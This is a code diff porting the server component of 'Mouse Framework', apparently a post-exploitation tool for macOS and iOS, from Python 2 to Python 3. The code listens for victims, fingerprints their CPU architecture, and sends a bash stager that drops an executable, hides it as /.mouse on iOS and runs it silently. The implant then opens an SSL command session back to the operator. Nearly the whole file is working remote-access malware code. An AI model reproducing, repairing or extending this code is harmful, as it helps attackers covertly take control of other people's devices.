@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -19,18 +19,14 @@
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 import socket, ssl, os, json, sys
-import helper as h
-import session
+import core.helper as h
+import core.session as session
 import binascii
-from multihandler import MultiHandler
+from core.multihandler import MultiHandler
 import time
-
-downloads_dir = "../downloads"
 
 class Server:
     def __init__(self):
-        if not os.path.isdir("downloads"):
-            os.makedirs("downloads")
         self.macos_architectures = ["i386"]
         self.ios_architectures = ["arm64","armv7s", "arm"]
         self.host = None
@@ -53,7 +49,6 @@ class Server:
                 continue
             else:
                 m = __import__(mod[:-3]).command()
-                #add module info to dictionary
                 modules[m.name] = m
         return modules
 
@@ -72,11 +67,11 @@ class Server:
         try:
             lhost = h.getip()
             lport = None
-            choice = raw_input(h.info_general_raw("Local host: ")).strip(" ")
+            choice = input(h.info_general_raw("Local host: ")).strip(" ")
             if choice != "":
                 lhost = choice
             while True:
-                lport = raw_input(h.info_general_raw("Local port: ")).strip(" ")
+                lport = input(h.info_general_raw("Local port: ")).strip(" ")
                 if not lport:
                     lport = 4444
                 try:
@@ -114,11 +109,10 @@ class Server:
     def start_multi_handler(self):
         self.multihandler.start_background_server()
         self.multihandler.interact()
-        print ""
+        print("")
 
 
     def craft_payload(self,device_arch):
-        # TODO: Detect uid before we send executable
         if not self.host:
             h.info_error("Local host is not set!")
             return
@@ -136,7 +130,7 @@ class Server:
             instructions = \
             "cat >/private/tmp/mouse;"+\
             "chmod 777 /private/tmp/mouse;"+\
-            "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/private/tmp/mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing macOS payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
@@ -149,7 +143,7 @@ class Server:
             "cat >/tmp/mouse;"+\
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
-            "/.mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing iOS payload...") 
             return (instructions,payload)
         else:
@@ -157,10 +151,8 @@ class Server:
             return
 
     def listen_for_stager(self):
-        #craft shell script
         identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
-        #listen for connection
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', self.port))
@@ -172,24 +164,24 @@ class Server:
             s.close()
             return
 
-        # identify device
         hostAddress = addr[0]
         self.verbose_print("Connecting to "+hostAddress+"...")
-        conn.send(identification_shell_command)
-        device_arch = conn.recv(128).strip()
-        if not device_arch:
+        conn.send(identification_shell_command.encode())
+        try:
+            device_arch = conn.recv(128).decode().strip()
+            if not device_arch:
+                return
+        except:
             return
 
-        # send bash stager
         try:
             bash_stager, executable = self.craft_payload(device_arch)
         except Exception as e:
-            raw_input("Press enter to continue...").strip(" ")
+            input("Press enter to continue...").strip(" ")
             return
         self.debug_print(bash_stager.strip())
-        conn.send(bash_stager)
+        conn.send(bash_stager.encode())
 
-        # send executable
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
@@ -205,7 +197,6 @@ class Server:
 
 
     def listen_for_executable_payload(self,s):
-        # accept connection
         ssl_con, hostAddress = s.accept()
         s.settimeout(5)
         ssl_sock = ssl.wrap_socket(ssl_con,
@@ -213,7 +204,7 @@ class Server:
                                  certfile=".keys/server.crt",
                                  keyfile=".keys/server.key",
                                  ssl_version=ssl.PROTOCOL_SSLv23)
-        raw = ssl_sock.recv(256)
+        raw = ssl_sock.recv(256).decode()
         device_info = json.loads(raw)
         return session.Session(self,ssl_sock,device_info)
         
@@ -224,5 +215,3 @@ class Server:
         old_session.hostname = new_session.hostname
         old_session.username = new_session.username
         old_session.type = new_session.type
-
-   
